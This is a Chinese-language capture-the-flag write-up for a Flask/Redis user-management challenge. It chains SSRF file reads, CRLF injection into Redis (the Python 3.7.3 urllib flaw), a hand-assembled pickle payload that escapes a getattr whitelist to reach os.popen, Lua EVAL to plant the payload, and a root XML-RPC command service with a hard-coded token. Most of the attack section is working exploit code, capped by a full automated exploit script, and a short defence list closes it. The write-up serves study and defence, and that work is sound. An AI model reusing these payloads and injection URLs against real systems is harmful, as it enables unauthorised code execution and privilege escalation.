# DART CTF - Auth 用户管理系统 WriteUp

> **题目名称**: Auth 用户管理系统
> **题目类别**: 软件审计 (Web)
> **Flag**: `dart{a04f4f1e-b922-4142-bc77-c1a2742891b7}`
> **靶机地址**: `http://bba82259-d2c2-4758-a02d-1acbe96afeb9.24.dart.ccsssc.com`

---

## 一、题目概述

题目是一个基于 Flask 的用户管理系统，后端使用 Redis 存储用户数据和在线状态。攻击链涉及 **SSRF → CRLF注入 → Redis命令注入 → Pickle反序列化RCE → 隐藏服务发现 → 提权读Flag**，共六个阶段。

最终 `/flag` 文件权限为 `-r--------` 仅 root 可读，Web 应用以 `ctf`（UID 1000）运行，需要发现并利用以 root 运行的内部 XML-RPC 服务才能完成提权。

---

## 二、环境信息

| 项目 | 详情 |
|------|------|
| Web框架 | Flask (Werkzeug/2.2.3) |
| Python版本 | 3.7.3（存在 CVE-2019-9740/9947 CRLF漏洞） |
| 数据库 | Redis 6.2.21，密码 `redispass123`，端口 6379 |
| 运行用户 | `ctf` (UID 1000) |
| 容器 | Docker (Alpine Linux) |
| 隐藏服务 | XML-RPC (端口 54321)，以 **root** 运行 |

---

## 三、完整攻击链

```
SSRF文件读取 → 获取源码
       ↓
CRLF注入Redis → 修改用户角色为admin
       ↓
Pickle反序列化RCE → 获得ctf用户shell
       ↓
进程枚举 → 发现root XML-RPC服务
       ↓
XML-RPC execute_command → root权限读取/flag
```

---

## 四、详细过程

### 阶段一：SSRF 文件读取 — 获取源码

#### 4.1.1 发现 SSRF 入口

注册登录后，在 `/profile/avatar` 页面发现头像上传功能，支持"从URL下载"模式。该功能使用 `urllib.request.urlopen()` 请求用户提供的 URL，构成经典 SSRF。

关键参数：
- `upload_type`：必须为 `从URL下载`（中文值），否则返回"无效的上传类型"
- `avatar_url`：目标 URL

```python
# SSRF请求模板
form_data = urllib.parse.urlencode({
    'upload_type': '从URL下载',
    'avatar_url': 'file:///etc/passwd'
})
req = urllib.request.Request(f'{BASE}/profile/avatar', data=form_data.encode(), method='POST')
req.add_header('Content-Type', 'application/x-www-form-urlencoded')
```

#### 4.1.2 读取应用源码

利用 `file://` 协议读取服务器文件。响应中将文件内容 Base64 编码嵌入 `<img>` 标签，解码即可获得文件内容：

```python
avatar_url = 'file:///app/app.py'   # Flask 应用源码
avatar_url = 'file:///etc/redis/redis.conf'  # Redis 配置
```

**关键发现 — Redis 配置**：
```
requirepass redispass123
bind 0.0.0.0
protected-mode no
dir /var/lib/redis
```

**关键发现 — Flask SECRET_KEY**（源码中硬编码）：
```python
app.secret_key = '990f4b40584446c9ff9b672e63c0154ed7f5a8940d7af54477bd9191414d076d'
```

#### 4.1.3 源码核心逻辑分析

**RestrictedUnpickler 白名单**（反序列化防护）：

```python
class RestrictedUnpickler(pickle.Unpickler):
    ALLOWED_MODULES_CLASSES = {
        'builtins': {'getattr', 'setattr', 'dict', 'list', 'tuple'},
        '__main__': {'OnlineUser'},
    }

    def find_class(self, module, name):
        if module in self.ALLOWED_MODULES_CLASSES:
            if name in self.ALLOWED_MODULES_CLASSES[module]:
                return getattr(sys.modules.get(module, __import__(module)), name)
        raise pickle.UnpicklingError(f"Restricted: {module}.{name}")
```

**在线用户反序列化**（`/admin/online-users` 路由）：

```python
online_keys = r.keys('online_user:*')
for key in online_keys:
    serialized = r.get(key)
    if serialized:
        file = io.BytesIO(serialized)
        unpickler = RestrictedUnpickler(file)
        online_user = unpickler.load()  # ← 反序列化触发点
```

该路由会遍历 Redis 中所有 `online_user:*` 键，对其值进行 pickle 反序列化，并将结果展示在页面表格中。

---

### 阶段二：CRLF 注入 Redis — 获得管理员权限

#### 4.2.1 CRLF 注入原理

Python 3.7.3 的 `http.client` 模块在构造 HTTP 请求时，**不对 URL 路径中的 `\r\n` 进行过滤**（CVE-2019-9740/9947，直到 3.7.4 才修复）：

```python
# http/client.py Line 1104 - 无 CRLF 校验
request = '%s %s %s' % (method, url, self._http_vsn_str)
self._output(request.encode('ascii'))
```

当 SSRF 目标为 Redis 时，URL 路径中的 `\r\n` 会被原样发送，注入额外的 Redis 命令：

```
GET /x\r\n         ← 第一行（被Redis忽略）
AUTH redispass123\r\n   ← Redis认证
HSET user:testuser123 role admin\r\n  ← 修改用户角色
```

#### 4.2.2 验证 CRLF 注入

```python
# 注入Redis命令修改手机号为 "CRLF_SUCCESS"
url = "http://127.0.0.1:6379/x\r\nAUTH redispass123\r\nHSET user:testuser123 phone CRLF_SUCCESS\r\n"
```

重新登录后访问 `/profile`，手机号字段变为 `CRLF_SUCCESS` —— 确认 CRLF 注入成功。

#### 4.2.3 提升为管理员

```python
url = "http://127.0.0.1:6379/x\r\nAUTH redispass123\r\nHSET user:testuser123 role admin\r\n"
```

重新登录后即可访问 `/admin/online-users` 等管理路由。

---

### 阶段三：Pickle 反序列化 RCE

#### 4.3.1 白名单绕过思路

`RestrictedUnpickler` 仅允许以下类：
- `builtins.getattr` / `builtins.setattr` / `builtins.dict` / `builtins.list` / `builtins.tuple`
- `__main__.OnlineUser`

关键在于 `builtins.getattr` 被允许。通过 `getattr` 链可以访问任意属性，实现任意代码执行：

```
getattr(OnlineUser, '__init__')           → bound method
getattr(__init__, '__globals__')           → globals dict
globals['os']                              → os module
getattr(os, 'popen')                       → os.popen function
os.popen(cmd).read()                       → 命令输出
```

#### 4.3.2 Pickle Payload 构造

手工构造 pickle 操作码序列（Protocol 2）：

```python
def build_pickle(command):
    p = b'\x80\x02'  # PROTO 2

    # Step 1: 获取 getattr 函数
    p += b'\x8c\x08builtins\x8c\x07getattr\x93'  # STACK_GLOBAL → getattr

    # Step 2: getattr(OnlineUser, '__init__')
    p += b'\x8c\x08__main__X\x0a\x00\x00\x00OnlineUser\x93'  # OnlineUser class
    p += b'\x8c\x08__init__\x86R'  # TUPLE2 + REDUCE → __init__
    p += b'\x94'  # MEMOIZE as 0

    # Step 3: getattr(__init__, '__globals__')
    p += b'\x8c\x08builtins\x8c\x07getattr\x93'
    p += b'h\x00'  # BINGET 0 → __init__
    p += b'\x8c\x0b__globals__\x86R\x94'  # → globals dict, MEMOIZE as 1

    # Step 4: globals.__getitem__('os')
    p += b'\x8c\x08builtins\x8c\x07getattr\x93'
    p += b'h\x01'  # BINGET 1 → globals
    p += b'\x8c\x0b__getitem__\x86R'  # → __getitem__ method
    p += b'\x8c\x02os\x85R\x94'  # TUPLE1('os') + REDUCE → os module, MEMOIZE as 2

    # Step 5: getattr(os, 'popen')
    p += b'\x8c\x08builtins\x8c\x07getattr\x93'
    p += b'h\x02\x8c\x05popen\x86R'  # → os.popen

    # Step 6: os.popen(command)
    cmd = command.encode()
    p += b'\x8c' + bytes([len(cmd)]) + cmd  # SHORT_BINUNICODE
    p += b'\x85R\x94'  # TUPLE1 + REDUCE → popen object, MEMOIZE as 3

    # Step 7: getattr(popen, 'read')()
    p += b'\x8c\x08builtins\x8c\x07getattr\x93'
    p += b'h\x03\x8c\x04read\x86R'  # → read method
    p += b')R\x94'  # EMPTY_TUPLE + REDUCE → command output, MEMOIZE as 4

    # Step 8: OnlineUser('x', 'admin')
    p += b'\x8c\x08__main__X\x0a\x00\x00\x00OnlineUser\x93'
    p += b'\x8c\x01x\x8c\x05admin\x86R'  # REDUCE → instance

    # Step 9: BUILD — 用 dict 更新 __dict__
    p += b'}'   # EMPTY_DICT
    p += b'('   # MARK  ← 关键！SETITEMS 需要 MARK
    p += b'\x8c\x08username'
    p += b'h\x04'  # BINGET 4 → 命令输出作为 username
    p += b'\x8c\x04role\x8c\x05admin'
    p += b'X\x0a\x00\x00\x00login_time\x8c\x132026-01-01 00:00:00'
    p += b'\x8c\x0bexpiry_time\x8c\x132027-01-01 00:00:00'
    p += b'X\x0a\x00\x00\x00ip_address\x8c\x09127.0.0.1'
    p += b'u'   # SETITEMS（消费MARK到此处的栈内容）
    p += b'b'   # BUILD（将dict应用到obj.__dict__）
    p += b'.'   # STOP
    return p
```

> **踩坑记录**：初始版本遗漏了 MARK 操作码（`(`），导致 `SETITEMS` 报错 `could not find MARK`。`SETITEMS (u)` 需要栈上有 `MARK` 作为起始标记，格式为：`EMPTY_DICT → MARK → key1 val1 key2 val2 ... → SETITEMS`。

#### 4.3.3 注入 Pickle 到 Redis

直接通过 CRLF 注入二进制 pickle 数据到 Redis 不可行（RESP 协议不支持原始二进制嵌入在行内协议中）。解决方案是使用 **Redis Lua EVAL + `string.gsub` 将 hex 字符串转为二进制**：

```lua
local h=[[80028c086275...75622e]]  -- pickle hex
local b = h:gsub([[..]], function(cc)
    return string.char(tonumber(cc, 16))
end)
redis.call([[SET]], [[online_user:rce]], b)
return 1
```

通过 CRLF 注入执行：

```python
lua_script = f'local h=[[{PICKLE_HEX}]] local b=h:gsub([[..]],function(cc) return string.char(tonumber(cc,16)) end) redis.call([[SET]],[[online_user:rce]],b) return 1'

url = f'http://127.0.0.1:6379/x\r\nAUTH redispass123\r\nEVAL "{lua_script}" 0\r\n'
```

> **注意事项**：
> - Lua `[[...]]` 长字符串不能包含 `]]`（hex `5d5d`），否则需改用 `[=[...]=]`
> - Lua `for` / `while` 循环中的逗号和比较运算符在 CRLF 注入的 URL 上下文中可能被截断，使用 `gsub` + 回调函数完美规避

#### 4.3.4 触发反序列化

访问 `/admin/online-users`（需管理员权限），Flask 自动对所有 `online_user:*` 键进行反序列化：

```python
req = urllib.request.Request(f'{BASE}/admin/online-users')
resp = opener.open(req, timeout=30)
body = resp.read().decode('utf-8', errors='replace')
```

命令输出出现在表格的 `username` 列中。

#### 4.3.5 初步 RCE 结果

```
$ id;whoami
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
ctf

$ ls -la /flag
-r--------    1 root     root    43 Mar 14 05:24 /flag

$ cat /flag 2>&1
cat: can't open '/flag': Permission denied
```

**CTF 用户无法读取 root 独占的 `/flag` 文件。需要提权。**

---

### 阶段四：提权 — 发现并利用 Root XML-RPC 服务

#### 4.4.1 进程枚举

```
$ ps aux
PID   USER     COMMAND
    1 root     {start.sh} /bin/sh /start.sh
   11 root     python /opt/mcp_service/mcp_server_secure_e938a2d234b7968a885bbbbb63cde7b9.py
   14 ctf      redis-server 0.0.0.0:6379
   20 ctf      python app.py
```

发现 **PID 11 以 root 权限** 运行了一个 Python 服务。

```
$ netstat -tlnp
Proto  Local Address    State    PID/Program
tcp    0.0.0.0:6379     LISTEN   14/redis-server
tcp    0.0.0.0:5000     LISTEN   20/python
tcp    0.0.0.0:54321    LISTEN   -              ← ROOT 服务！
```

端口 54321 对应 PID 11 的 root 服务。

#### 4.4.2 读取 Root 服务源码

通过 `file://` SSRF 或 RCE `cat` 读取 `/opt/mcp_service/mcp_server_secure_e938a2d234b7968a885bbbbb63cde7b9.py`，发现这是一个 **XML-RPC 服务**：

```python
class MCPServerSecure:
    def __init__(self, host='0.0.0.0', port=54321):
        self.auth_token = "mcp_secure_token_b2rglxd"  # 硬编码认证令牌！

    def execute_command(self, command):
        """执行系统命令 — 以 ROOT 权限运行"""
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
        return {
            'command': command,
            'stdout': result.stdout,
            'stderr': result.stderr,
            'success': result.returncode == 0
        }

    def read_file(self, filepath):
        """读取文件 — 过滤了 'flag' 关键字"""
        if 'flag' in filepath:  # ← read_file 被过滤
            return {'error': 'Access to sensitive file restricted'}
        # ...
```

关键发现：
- **认证令牌**：`mcp_secure_token_b2rglxd`（硬编码在源码中）
- **`execute_command` 方法**：以 root 权限执行任意命令，**无关键字过滤**
- `read_file` 方法过滤了 `flag`，但 `execute_command` 没有任何限制

#### 4.4.3 通过 XML-RPC 以 Root 权限读取 Flag

通过 pickle RCE 在容器内部调用 XML-RPC 服务：

```python
py_cmd = """python3 -c "
import xmlrpc.client
s = xmlrpc.client.ServerProxy('http://127.0.0.1:54321/RPC2')
r = s.execute_command('mcp_secure_token_b2rglxd', 'cat /flag')
print(r)
" 2>&1"""
```

执行结果：

```python
{'command': 'cat /flag', 'returncode': 0,
 'stdout': 'dart{a04f4f1e-b922-4142-bc77-c1a2742891b7}\n',
 'stderr': '', 'success': True}
```

---

## 五、Flag

```
dart{a04f4f1e-b922-4142-bc77-c1a2742891b7}
```

---

## 六、漏洞链总结

```
┌─────────────────────────────────────────────────────────────┐
│  1. SSRF (file://)                                         │
│     avatar_url=file:///app/app.py                          │
│     → 获取完整源码、Redis密码、SECRET_KEY                    │
├─────────────────────────────────────────────────────────────┤
│  2. CRLF Injection (CVE-2019-9740/9947)                    │
│     Python 3.7.3 urllib 不过滤URL路径中的\r\n               │
│     avatar_url=http://127.0.0.1:6379/x\r\nAUTH...\r\n     │
│     → 任意Redis命令执行                                     │
├─────────────────────────────────────────────────────────────┤
│  3. Redis → Admin                                          │
│     HSET user:testuser123 role admin                       │
│     → 获得管理员权限，可访问 /admin/online-users             │
├─────────────────────────────────────────────────────────────┤
│  4. Pickle Deserialization RCE                              │
│     白名单允许 builtins.getattr → getattr链 → os.popen     │
│     通过 Lua EVAL + gsub hex解码写入 online_user:rce        │
│     访问 /admin/online-users 触发反序列化                    │
│     → ctf 用户 (UID 1000) RCE                              │
├─────────────────────────────────────────────────────────────┤
│  5. Privilege Escalation                                    │
│     ps aux 发现 root 运行的 XML-RPC 服务 (port 54321)       │
│     源码泄露认证令牌: mcp_secure_token_b2rglxd              │
│     execute_command 以 root 执行任意命令，无关键字过滤        │
│     → root 权限读取 /flag                                   │
└─────────────────────────────────────────────────────────────┘
```

---

## 七、关键踩坑记录

### 7.1 upload_type 参数

SSRF 端点要求 `upload_type=从URL下载`（中文），缺少此参数直接返回"无效的上传类型"，不执行任何 URL 请求。

### 7.2 CRLF 注入后需重新登录

CRLF 注入修改 Redis 后，当前 session 不会感知变化。必须创建新 session（重新登录）才能在 profile 页面看到更新后的值。

### 7.3 Pickle MARK 操作码

`SETITEMS (u)` 操作码需要栈上存在 `MARK (()` 标记。初始版本遗漏 MARK 导致 `could not find MARK` 错误。正确序列：

```
}    EMPTY_DICT
(    MARK         ← 必须有！
...  key-value pairs
u    SETITEMS
b    BUILD
```

### 7.4 Lua 循环在 CRLF 上下文中失败

Lua 的 `for i=1,#h,2 do ... end` 语法中的逗号和 `<=` 比较运算符在 Redis CRLF 注入的 URL 上下文中被截断或误解析。改用 `string.gsub('..', callback)` 完美替代循环。

### 7.5 pickletools.dis() 的误导

`pickletools.dis()` 对 "stack not empty after STOP" 抛出异常，但实际上 `pickle.loads()` 只取栈顶元素，中间的 getattr 链残留在栈上不影响反序列化。不应将 pickletools 验证结果作为有效性判断依据。

---

## 八、利用脚本

### 完整自动化 Exploit

```python
#!/usr/bin/env python3
"""DART CTF Auth — Full Auto Exploit"""
import urllib.request, urllib.parse, http.cookiejar, re, time, struct

BASE = 'http://TARGET.24.dart.ccsssc.com'

def make_session():
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPRedirectHandler()
    )
    login_data = urllib.parse.urlencode({
        'username': 'testuser123', 'password': 'test123456'
    }).encode()
    req = urllib.request.Request(f'{BASE}/login', data=login_data, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    resp = opener.open(req, timeout=15)
    resp.read()
    return opener

def ssrf(opener, url):
    form_data = urllib.parse.urlencode({
        'upload_type': '从URL下载', 'avatar_url': url
    })
    req = urllib.request.Request(
        f'{BASE}/profile/avatar', data=form_data.encode(), method='POST'
    )
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    try:
        resp = opener.open(req, timeout=30)
        return resp.read().decode('utf-8', errors='replace')
    except:
        return ""

def build_pickle(command):
    p = b'\x80\x02'
    p += b'\x8c\x08builtins\x8c\x07getattr\x93'
    p += b'\x8c\x08__main__X\x0a\x00\x00\x00OnlineUser\x93'
    p += b'\x8c\x08__init__\x86R\x94'
    p += b'\x8c\x08builtins\x8c\x07getattr\x93h\x00'
    p += b'\x8c\x0b__globals__\x86R\x94'
    p += b'\x8c\x08builtins\x8c\x07getattr\x93h\x01'
    p += b'\x8c\x0b__getitem__\x86R\x8c\x02os\x85R\x94'
    p += b'\x8c\x08builtins\x8c\x07getattr\x93h\x02'
    p += b'\x8c\x05popen\x86R'
    cmd = command.encode()
    if len(cmd) < 256:
        p += b'\x8c' + bytes([len(cmd)]) + cmd
    else:
        p += b'X' + struct.pack('<I', len(cmd)) + cmd
    p += b'\x85R\x94'
    p += b'\x8c\x08builtins\x8c\x07getattr\x93h\x03'
    p += b'\x8c\x04read\x86R)R\x94'
    p += b'\x8c\x08__main__X\x0a\x00\x00\x00OnlineUser\x93'
    p += b'\x8c\x01x\x8c\x05admin\x86R'
    p += b'}(\x8c\x08usernameh\x04\x8c\x04role\x8c\x05admin'
    p += b'X\x0a\x00\x00\x00login_time\x8c\x132026-01-01 00:00:00'
    p += b'\x8c\x0bexpiry_time\x8c\x132027-01-01 00:00:00'
    p += b'X\x0a\x00\x00\x00ip_address\x8c\x09127.0.0.1ub.'
    return p

# ===== Step 1: Set admin role =====
print("[1] Setting admin role via CRLF injection...")
ssrf(make_session(),
     'http://127.0.0.1:6379/x\r\nAUTH redispass123\r\n'
     'HSET user:testuser123 role admin\r\n')
time.sleep(0.5)

# ===== Step 2: Inject RCE pickle (calls XML-RPC as root) =====
print("[2] Injecting pickle payload...")
rce_cmd = (
    'python3 -c "'
    "import xmlrpc.client;"
    "s=xmlrpc.client.ServerProxy('http://127.0.0.1:54321/RPC2');"
    "r=s.execute_command('mcp_secure_token_b2rglxd','cat /flag');"
    "print(r.get('stdout',''))"
    '" 2>&1'
)
payload = build_pickle(rce_cmd)
hex_str = payload.hex()
d = "[=[" if "5d5d" in hex_str else "[["
e = "]=]" if "5d5d" in hex_str else "]]"
lua = (f'redis.call({d}DEL{e},{d}online_user:rce{e}) '
       f'local h={d}{hex_str}{e} '
       f'local b=h:gsub({d}..{e},function(cc) '
       f'return string.char(tonumber(cc,16)) end) '
       f'redis.call({d}SET{e},{d}online_user:rce{e},b) return 1')
ssrf(make_session(),
     f'http://127.0.0.1:6379/x\r\nAUTH redispass123\r\nEVAL "{lua}" 0\r\n')
time.sleep(0.5)

# ===== Step 3: Trigger deserialization =====
print("[3] Triggering deserialization...")
ssrf(make_session(),
     'http://127.0.0.1:6379/x\r\nAUTH redispass123\r\n'
     'HSET user:testuser123 role admin\r\n')
time.sleep(0.3)

opener = make_session()
req = urllib.request.Request(f'{BASE}/admin/online-users')
resp = opener.open(req, timeout=30)
body = resp.read().decode('utf-8', errors='replace')

# ===== Step 4: Extract flag =====
flags = re.findall(r'dart\{[^}]+\}', body)
if flags:
    print(f"\n[FLAG] {flags[0]}")
else:
    # Check username column for flag content
    rows = re.findall(r'<tr>(.*?)</tr>', body, re.DOTALL)
    for row in rows:
        cells = re.findall(r'<td>(.*?)</td>', row, re.DOTALL)
        if cells and '127.0.0.1' in str(cells):
            content = cells[0].strip()
            print(f"\n[OUTPUT] {content}")
            f = re.findall(r'dart\{[^}]+\}', content)
            if f:
                print(f"[FLAG] {f[0]}")
```

---

## 九、防御建议

1. **升级 Python 版本**：Python 3.7.3 存在已知 CRLF 注入漏洞，应升级至 >= 3.7.4
2. **SSRF 防护**：禁止 `file://` 协议，限制内网 IP 访问，使用 URL 白名单
3. **pickle 反序列化**：避免使用 pickle 反序列化不可信数据，改用 JSON
4. **Redis 安全**：使用 Unix Socket 替代 TCP，禁用 EVAL，使用 ACL 限制命令
5. **内部服务**：不应将认证令牌硬编码在源码中，服务间通信应使用 mTLS
6. **最小权限**：内部管理服务不应以 root 运行，应使用专用低权限用户
